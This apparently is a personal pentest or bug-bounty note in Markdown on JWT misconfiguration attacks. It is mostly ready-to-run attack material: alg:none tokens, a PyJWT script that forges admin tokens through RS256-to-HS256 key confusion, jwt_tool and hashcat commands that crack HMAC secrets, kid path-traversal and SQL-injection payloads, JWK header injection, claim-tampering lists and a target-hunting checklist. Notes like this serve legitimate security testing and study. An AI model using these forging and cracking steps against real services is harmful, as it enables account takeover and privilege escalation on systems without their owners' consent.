---
tags: [bac, theory, jwt, token, critical]
type: theory
severity: critical
owasp_ref: "A01:2021"
date: 2026-03-10
---

# 🔑 JWT Misconfiguration — Access Control Bypass

## JWT Structure
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SIG
       ↓                         ↓                              ↓
  {"alg":"HS256"}    {"sub":"user123","role":"user"}     HMAC-SHA256
```

Decode any JWT instantly at jwt.io, or from the command line:
```bash
echo "PAYLOAD_PART" | base64 -d 2>/dev/null; echo
```

---

## Attack 1: Algorithm Confusion — `none` Attack

```json
// Change header to:
{"alg": "none"}
// Empty the signature entirely
eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIn0.
//                                                                  ↑ trailing dot, empty sig
```
```bash
# jwt_tool handles all alg variants (none, None, NONE, nOnE):
python3 jwt_tool.py TOKEN -X a
```

---

## Attack 2: RS256 → HS256 Algorithm Confusion

**Why it works**: If a server using RS256 is tricked into treating its own public key as the HMAC secret, you can sign arbitrary payloads with that public key — which you already have.

```
Normal RS256:  server signs with PRIVATE key, verifies with PUBLIC key
Attack:        you sign with PUBLIC key using HS256
               server verifies HS256 with... the PUBLIC key ← same bytes, wrong alg
               if the library blindly trusts the alg header: bypass!
```

**Step 1 — Get the public key** (one of these sources):
```bash
# JWKS endpoint (most common):
curl https://target.com/.well-known/jwks.json
curl https://target.com/api/auth/jwks
curl https://target.com/oauth/jwks

# Or: embedded in JWT header's `x5c` or `x5u` field
# Or: git repo, documentation, login page source
```

**Step 2 — Attack with jwt_tool** (recommended — handles key conversion automatically):
```bash
# Save the PEM-formatted public key to pubkey.pem first
python3 jwt_tool.py TOKEN -X s -pk pubkey.pem
```

**Step 3 — Manual approach** (if you have a PEM file):
```bash
# Dependency: pip install PyJWT cryptography
python3 - <<'EOF'
import jwt

# pubkey.pem must be a real PEM file starting with:
# -----BEGIN PUBLIC KEY-----
with open("pubkey.pem", "rb") as f:
    pubkey_bytes = f.read()

# IMPORTANT: PyJWT needs the raw PEM bytes as the HMAC secret
forged = jwt.encode(
    {"sub": "user123", "role": "admin", "exp": 9999999999},
    pubkey_bytes,          # public key bytes used as HMAC secret
    algorithm="HS256"
)
print(forged)
EOF
```

**Converting a JWK to PEM** (when you only have the JWKS JSON):
```bash
# Option A: Use mkjwk.org — paste the JWK, download the PEM
# Option B: python-jose library:
pip install python-jose
python3 - <<'EOF'
import json, requests
from jose.utils import base64url_decode
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

jwks = requests.get("https://target.com/.well-known/jwks.json").json()
key = jwks["keys"][0]   # take first key

n = int.from_bytes(base64url_decode(key["n"]), "big")
e = int.from_bytes(base64url_decode(key["e"]), "big")
pub = RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
open("pubkey.pem", "wb").write(pem)
print("Saved pubkey.pem")
EOF
```

---

## Attack 3: HMAC Secret Brute-Force (HS256)

```bash
# hashcat — fastest (GPU-accelerated):
hashcat -a 0 -m 16500 \
  "eyJhbGciOiJIUzI1NiJ9.PAYLOAD.SIG" \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# jwt_tool — more flexible:
python3 jwt_tool.py TOKEN -C -d /usr/share/seclists/Fuzzing/jwt-secrets.txt

# Once cracked, re-sign with any payload:
python3 jwt_tool.py TOKEN -T -S hs256 -p "crackedsecret"
```

---

## Attack 4: Kid Header Path Traversal

```json
{"alg":"HS256","kid":"../../dev/null"}
// Server loads the key from file path derived from kid
// /dev/null = empty bytes = sign token with empty secret ""
```

```bash
# Test: sign a token with empty secret:
python3 jwt_tool.py TOKEN -T -S hs256 -p ""
# Or: kid pointing to a known file with known content
```

---

## Attack 5: Kid Header SQL Injection

```json
{"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'-- "}
// If kid is interpolated into a SQL query to fetch the signing key,
// attacker controls what is returned as the key
```

```bash
python3 jwt_tool.py TOKEN -T   # set kid to SQLi payload, sign with 'attacker_secret'
```

---

## Attack 6: JWK Header Injection

```json
// Embed attacker's own public key in the header:
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_MODULUS_BASE64",
    "e": "AQAB"
  }
}
// Sign with corresponding attacker private key
// Vulnerable libraries trust the embedded JWK without checking a whitelist
```

```bash
python3 jwt_tool.py TOKEN -X k   # auto-generates attacker key pair + injects jwk
```

---

## Attack 7: Claim Tampering (After Cracking or Re-signing)

```json
// Payload fields to modify:
{"role": "admin"}
{"is_admin": true}
{"isAdmin": true}
{"admin": true}
{"scope": "admin:all"}
{"permissions": ["*"]}
{"groups": ["admin", "superuser"]}
{"authorities": ["ROLE_ADMIN"]}
{"tier": "enterprise"}
{"exp": 9999999999}   // extend expiry
{"exp": 1000000000}   // set to past — test if enforced
```

---

## Attack 8: Token Expiry Not Enforced

```bash
# Decode the token and check the exp field:
python3 jwt_tool.py TOKEN -d   # shows all claims including exp

# Modify exp to a past timestamp — test if server still accepts it:
python3 jwt_tool.py TOKEN -T   # interactive tamper, set exp=1
```

---

## Where to Find JWTs

```
✓ Authorization header:  Authorization: Bearer eyJ...
✓ Cookies:               auth=eyJ..., jwt=eyJ..., token=eyJ...
✓ Response bodies:       {"access_token": "eyJ...", "token": "eyJ..."}
✓ localStorage:          DevTools → Application → Local Storage
✓ sessionStorage:        DevTools → Application → Session Storage
✓ URL fragments:         /callback#access_token=eyJ...  (implicit flow)
✓ Websocket messages:    handshake or first message may carry JWT
```

---

## Hunting Checklist
- [ ] #task Find ALL JWTs in requests (header, cookies, bodies, storage)
- [ ] #task Decode JWT at jwt.io — note alg, kid, all claims
- [ ] #task Test alg:none attack
- [ ] #task If RS256: fetch public key, test RS256→HS256 confusion
- [ ] #task If HS256: brute-force secret with hashcat
- [ ] #task Modify role/admin/scope claims, re-sign, test
- [ ] #task Check kid header — test path traversal and SQLi
- [ ] #task Test jwk header injection
- [ ] #task Test with exp in the past — is expiry enforced?

---

## 🔗 Related Notes
- [[Horizontal-vs-Vertical]]
- [[OAuth-SSO-BAC]]
- [[API-BAC]]
- [[Privilege-Escalation]]
- [[Custom-Scripts]]

---
*Tags: #jwt #bac #token #bypass*
